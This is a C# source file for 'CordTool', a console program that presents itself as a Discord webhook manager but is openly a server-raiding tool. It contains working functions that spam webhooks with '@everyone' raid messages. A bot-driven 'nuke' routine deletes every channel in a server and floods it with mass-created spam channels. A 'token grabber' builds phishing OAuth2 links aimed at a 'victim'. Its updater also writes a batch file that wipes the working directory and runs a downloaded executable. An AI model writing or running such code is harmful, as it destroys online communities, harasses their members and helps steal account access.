using DSharpPlus;
using DSharpPlus.CommandsNext;
using DSharpPlus.Entities;
using DSharpPlus.EventArgs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.DataVisualization.Charting;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;


namespace CordTool
{
    internal class Program
    {
        static DiscordClient discord;
        static DiscordGuild currentGuild;
        static DiscordChannel currentChannel;
        static ConcurrentQueue<string> messageQueue = new ConcurrentQueue<string>();

        static async Task Main(string[] args)
        {
            while (true)
            {
                Console.Title = "CordTool";
                Banner();
                Menu();
                ConsoleKeyInfo input = Console.ReadKey();
                char option = input.KeyChar;
                Console.WriteLine(option);
                switch (option)
                {
                    case '1':
                        webhookMessage();
                        Console.Clear();
                        Console.WriteLine("Message sent! Check your Discord client to check if it succeeded.");
                        break;
                    case '6':
                        return;
                    case '5':
                        Console.Clear();
                        await TokenGrab();
                        Console.WriteLine("Press any key to return to menu");
                        Console.ReadKey();
                        Console.Clear();
                        break;
                    case '4':
                        nukeServerBetter();
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("N");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nu");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nuk");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nuke");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nuked");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nuked!");
                        Console.ResetColor();
                        break;
                    case '2':
                        nukeServer();
                        Console.Clear();
                        Console.WriteLine("Nuked!");
                        break;
                    case '3':
                        await loginBot();
                        Thread.Sleep(10000);
                        Console.Clear();
                        break;
                    case 'P':
                        releaseNotes();
                        break;
                    case 'p':
                        releaseNotes();
                        break;
                    case 'Y':
                        CordToolGUI();
                        break;
                    case 'y':
                        CordToolGUI();
                        break;
                    case 'U':
                        await Update();
                        Thread.Sleep(1000);
                        Console.Clear();
                        break;
                    case 'u':
                        await Update();
                        Thread.Sleep(1000);
                        Console.Clear();
                        break;
                }
            }
        }

        static void Banner()
        {
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(@"


       _..._                                                                                             
    .-'_..._''.                          _______                                                   .---. 
  .' .'      '.\                         \  ___ `'.                                                |   | 
 / .'                                     ' |--.\  \                                               |   | 
. '                 .-''` ''-.    .-,.--. | |    \  '      .|      .-''` ''-.        .-''` ''-.    |   | 
| |               .'          '.  |  .-. || |     |  '   .' |_   .'          '.    .'          '.  |   | 
| |              /              ` | |  | || |     |  | .'     | /              `  /              ` |   | 
. '             '                '| |  | || |     ' .''--.  .-''                ''                '|   | 
 \ '.          .|         .-.    || |  '- | |___.' /'    |  |  |         .-.    ||         .-.    ||   | 
  '. `._____.-'/.        |   |   .| |    /_______.'/     |  |  .        |   |   ..        |   |   .|   | 
    `-.______ /  .       '._.'  / | |    \_______|/      |  '.' .       '._.'  /  .       '._.'  / '---' 
             `    '._         .'  |_|                    |   /   '._         .'    '._         .'  - @Epicinver :)    
                     '-....-'`                           `'-'       '-....-'`         '-....-'`          
");
            Console.ResetColor();
            Console.WriteLine("CordTool - A tool for managing and interacting with Discord webhooks.");
            Console.WriteLine("Developed by: Arran :)");
            Console.WriteLine("Version: 6.0.0 (Release notes: Type P)");
        }
        static void Menu()
        {
            Console.WriteLine("\n1. Send Webhook Message");
            Console.WriteLine("2. Nuke Server");
            Console.WriteLine("3. Login to a Bot (IN DEV)");
            Console.WriteLine("4. Nuke Server Better (Reccommended)");
            Console.WriteLine("5. Get a discord user's token");
            Console.WriteLine("6. Exit");
            Console.WriteLine("P. Release Notes");
            Console.WriteLine("Y. GUI version");
            Console.WriteLine("U. Update");
        }

        static async void webhookMessage()
        {
            Console.Clear();
            Console.Write("Webhook URL: ");
            string webhook = Console.ReadLine();

            Console.Write("Message: ");
            string message = Console.ReadLine();

            string json = $"{{\"content\": \"{message}\"}}";

            using (HttpClient client = new HttpClient())
            {
                HttpContent content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync(webhook, content);
            }
        }
        static async void nukeServer()
        {
            Console.Clear();
            Console.Write("Webhook URL: ");
            string webhook = Console.ReadLine();

            Console.Write("How many times should the loop go for? Enter: ");
            int looptimes;
            while (!int.TryParse(Console.ReadLine(), out looptimes) || looptimes <= 0)
            {
                Console.Write("Please enter a valid positive number: ");
            }

            Console.Write("What server invite should the webhook spam? [We spam this: RAIDED BY (Your server invite).] Enter: ");
            string serverinv = Console.ReadLine();

            string message = $"RAIDED BY {serverinv} @everyone";

            string json = $"{{\"content\": \"{message}\"}}";

            using (HttpClient client = new HttpClient())
            {
                for (int i = 0; i < looptimes; i++)
                {
                    HttpContent content = new StringContent(json, Encoding.UTF8, "application/json");
                    await client.PostAsync(webhook, content);
                }
            }


        }

        static async Task TokenGrab() {
            Console.Write("Enter Application ID: ");
            string appid = Console.ReadLine();
            // asking for the oauth2 link

            Console.Write("Enter oAuth2 link: ");
            string oauth2link = Console.ReadLine();

            // asking for the redirect url
            Console.Write("Enter your URL (used for redirect): ");
            string redirecturl = Console.ReadLine();



            string victimsoauth2link = oauth2link + "&client_id=" + appid + "&scope=identify%20guilds%20guilds.join%20email&response_type=token&redirect_uri=" + redirecturl;

            Console.WriteLine("Here is the victim's oAuth2 URL (you'll have to set it up yourself, like sending authorizationns to a webhook, or something!): " + victimsoauth2link);
        }

        static void loadinghaha()
        {
            Console.Clear();
            Console.WriteLine("Loading... 1%");
            Thread.Sleep(5000);
            Console.Clear();
            Console.WriteLine("Loading... 32%");
            Thread.Sleep(9000);
            Console.Clear();
            Console.WriteLine("Loading... 99%");
            Thread.Sleep(900);
            Console.Clear();
            Console.WriteLine("Loading... 100%");
            Console.Clear();
        }


        public static async Task loginBot()
        {
            Console.Clear();
            Console.Write("Bot Token: ");
            string token = Console.ReadLine();

            if (string.IsNullOrWhiteSpace(token))
            {
                Console.WriteLine("Token cannot be empty. Press any key to retry.");
                Console.ReadKey();
                await loginBot();
                return;
            }

            discord = new DiscordClient(new DiscordConfiguration
            {
                Token = token,
                TokenType = TokenType.Bot,
                Intents = DiscordIntents.All
            });

            discord.Ready += (c, e) =>
            {
                Console.WriteLine($"Connected as {c.CurrentUser.Username}!");
                return Task.CompletedTask;
            };

            discord.MessageCreated += (c, e) =>
            {
                if (currentChannel != null && e.Channel.Id == currentChannel.Id && !e.Author.IsBot)
                    messageQueue.Enqueue($"[{e.Author.Username}] {e.Message.Content}");
                return Task.CompletedTask;
            };

            await discord.ConnectAsync();

            // Start CLI loop
            while (true)
            {
                // Print queued messages
                while (messageQueue.TryDequeue(out string msg))
                    Console.WriteLine(msg);

                Console.Write("> ");
                string input = Console.ReadLine()?.Trim();
                if (string.IsNullOrWhiteSpace(input)) continue;

                switch (input.ToLower())
                {
                    case "help":
                        Console.WriteLine("You can use the following commands: help, guilds, setguild, channels, setchannel, send, users.");
                        break;
                    case "guilds":
                        foreach (var g in discord.Guilds.Values)
                            Console.WriteLine($"{g.Name} ({g.Id})");
                        break;
                    case "setguild":
                        Console.Write("Guild ID: ");
                        if (ulong.TryParse(Console.ReadLine(), out ulong gid))
                        {
                            currentGuild = await discord.GetGuildAsync(gid);
                            Console.WriteLine($"Selected guild: {currentGuild.Name}");
                        }
                        break;
                    case "channels":
                        if (currentGuild == null) { Console.WriteLine("Select guild first."); break; }
                        foreach (var ch in currentGuild.Channels.Values)
                            Console.WriteLine($"{ch.Name} ({ch.Id})");
                        break;
                    case "setchannel":
                        Console.Write("Channel ID: ");
                        if (ulong.TryParse(Console.ReadLine(), out ulong cid))
                        {
                            currentChannel = await discord.GetChannelAsync(cid);
                            Console.WriteLine($"Selected channel: {currentChannel.Name}");
                        }
                        break;
                    case "send":
                        if (currentChannel == null) { Console.WriteLine("Select channel first."); break; }
                        Console.Write("Message: ");
                        string msgToSend = Console.ReadLine();
                        await currentChannel.SendMessageAsync(msgToSend);
                        break;
                    case "users":
                        if (currentGuild == null) { Console.WriteLine("Select guild first."); break; }
                        foreach (var m in currentGuild.Members.Values)
                            Console.WriteLine($"{m.Username}#{m.Discriminator}");
                        break;
                    case "exit":
                        await discord.DisconnectAsync();
                        break;
                    default:
                        Console.WriteLine("Unknown command. Type 'help'.");
                        Environment.Exit(1);
                        break;
                }
            }
        }

            static async void nukeServerBetter()
        {
            Console.Clear();
            Console.Write("Bot Token: ");
            string Token = Console.ReadLine();

            Console.Write("Name override: ");
            string serverNameOverRide = Console.ReadLine();

            Console.Write("Server ID: ");
            string guildId = Console.ReadLine();

            Console.Write("Discord invite link: ");
            string serverInvite = Console.ReadLine();
            for (int i = 0; i < 1000000; i++)
            {
                var discord = new DiscordClient(new DiscordConfiguration()
                {
                    Token = Token,
                    TokenType = TokenType.Bot
                });

                await discord.ConnectAsync();

                var guild = await discord.GetGuildAsync(ulong.Parse(guildId)); // Your guild ID
                await guild.ModifyAsync(g => g.Name = serverNameOverRide);

                await discord.DisconnectAsync();

                Console.WriteLine("Something is happening in the Nuke function.");

                var channels = await guild.GetChannelsAsync();
                foreach (var channel in channels)
                {
                    try
                    {
                        await channel.DeleteAsync();

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Something is happening in the Nuke function. [technical: {ex}]");
                    }
                }

                for (int j = 0; j < 100000; j++)
                {
                    try
                    {
                        var channel = await guild.CreateTextChannelAsync($"NUKED-{j}");
                        for (int k = 0; k < 5; k++)
                        {
                            await channel.SendMessageAsync($"NUKED BY {serverInvite} @everyone");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Something happened during the nuke, and we don't know how to fix it. Here's the error code: {ex.Message}");
                    }
                }
            }
        }
        static void releaseNotes()
        {
            Console.Clear();
            Console.WriteLine("Release Notes for CordTool");
            Console.WriteLine("Type the version below.");
            ConsoleKeyInfo input = Console.ReadKey();
            char option = input.KeyChar;
            Console.WriteLine(option);
            switch (option)
            {
                case '1':
                    Console.WriteLine("Version 1.0.0 - Initial release with basic features.");
                    Console.WriteLine("There is 4 options: Nuke Server, Login to a bot, and send webhook message. The last is Exit, but that doesn't count.");
                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/Discord/DiscordHatesMe.zip");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
                case '2':
                    Console.WriteLine("Version 2.0.0 - Second release, not much.");
                    Console.WriteLine("There is 6 options: Nuke Server, Login to a bot, Send webhook message, Nuke Server (Better), and the Release Notes. The last is Exit, but that doesn't count.");
                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/v2.0.0/Cordtool.zip");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
                case '3':
                    Console.WriteLine("Version 3.0.0 - GUI version fully integrated.");
                    Console.WriteLine("A GUI version has been added, along with a few bug fixes!");
                    Console.WriteLine("The GUI was made in Windows Forms, with simple C#, and the Visual Studio Designer view.");
                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/v3.0.0/Cordtool.zip");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
                case '4':
                    Console.WriteLine("Version 4.0.0 - 4th release, bot client is functional.");
                    Console.WriteLine("The bot client is functional, but in development.");
                    Console.WriteLine("I had fun making this version!");
                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/v4.0.0/Cordtool.zip");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
                case '5':
                    Console.WriteLine("Version 5.0.0 - 5th release, bug fixes/updater.");
                    Console.WriteLine("This version has a few bug fixes, and i added a bug fixer.");
                    Console.WriteLine("The updater will check for updates with GitHub's API, and make a batch file if it finds any newer versions.");
                    Console.WriteLine("The updater will delete all files except the batch file, and then run the setup.exe that it downloaded. Then, it'll delete the batch file.");
                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/v4.0.0/Cordtool.zip");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
                case '6':
                    Console.WriteLine("Version 6.0.0 - Bullshit");
                    Console.WriteLine("Actually nothing, i just wasted my time lol");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
                case '7':
                    Console.WriteLine("Version 7.0.0 - 7th release, token grabber via oauth2 (only generates a link though!).");
                    Console.WriteLine("This version has a token grabber, which generates an oauth2 link for you to use.");
                    Console.WriteLine("Download: https://github.com/epicinver/cordtool/releases/v7.0.0/setup.exe");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
            }
        }

        static async Task Update()
        {
            Console.Clear();
            Console.WriteLine("Checking for updates...");

            const string VERSION_UPDATE_VAR = "7.0.0"; // current version
            const string GITHUB_API = "https://api.github.com/repos/epicinver/cordtool/releases/latest";

            try
            {
                var client = new System.Net.Http.HttpClient();
                client.DefaultRequestHeaders.UserAgent.ParseAdd("CordToolUpdater/1.0");

                string json = await client.GetStringAsync(GITHUB_API);

                dynamic release = Newtonsoft.Json.JsonConvert.DeserializeObject(json);
                string latestTag = release.tag_name;
                var assets = release.assets;

                Version latestVer, currentVer;
                if (Version.TryParse(latestTag.TrimStart('v'), out latestVer) &&
                    Version.TryParse(VERSION_UPDATE_VAR.TrimStart('v'), out currentVer) &&
                    latestVer > currentVer)
                {
                    Console.WriteLine("Update found: " + latestTag);

                    string setupUrl = null;
                    foreach (var asset in assets)
                    {
                        string name = asset.name;
                        if (string.Equals(name, "setup.exe", StringComparison.OrdinalIgnoreCase))
                        {
                            setupUrl = asset.browser_download_url;
                            break;
                        }
                    }

                    if (setupUrl == null)
                    {
                        Console.WriteLine("No setup.exe in release.");
                        return;
                    }

                    string tempPath = Path.Combine(Path.GetTempPath(), "CordTool_Setup.exe");
                    Console.WriteLine("Downloading setup.exe...");
                    byte[] setupBytes = await client.GetByteArrayAsync(setupUrl);
                    File.WriteAllBytes(tempPath, setupBytes); // sync version (C# 7.3 safe)

                    string batchFile = Path.Combine(Directory.GetCurrentDirectory(), "update.bat");
                    string batchContent =
        @"@echo off
echo Updating CordTool...
taskkill /IM CordTool.exe /F >nul 2>&1

REM Delete all files except update.bat
for %%f in (*.*) do (
    if /I not ""%%~nxf""==""update.bat"" (
        del /f /q ""%%f""
    )
)
for /d %%d in (*) do rd /s /q ""%%d""

echo Setting up new version...
start """" """ + tempPath + @"""

del /f /q update.bat
exit
";
                    File.WriteAllText(batchFile, batchContent);

                    Console.WriteLine("Running updater...");
                    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = batchFile,
                        UseShellExecute = true,
                        CreateNoWindow = true
                    });

                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("You already have the latest version.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Update failed: " + ex.Message);
            }

            Console.WriteLine("Press any key to continue...");
            Console.ReadKey();
        }


        static void CordToolGUI()
    {
        Console.Clear();
        Console.WriteLine("Minimise this window and focus on the GUI.");
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new Form1());
        Console.Clear();
    }

}
}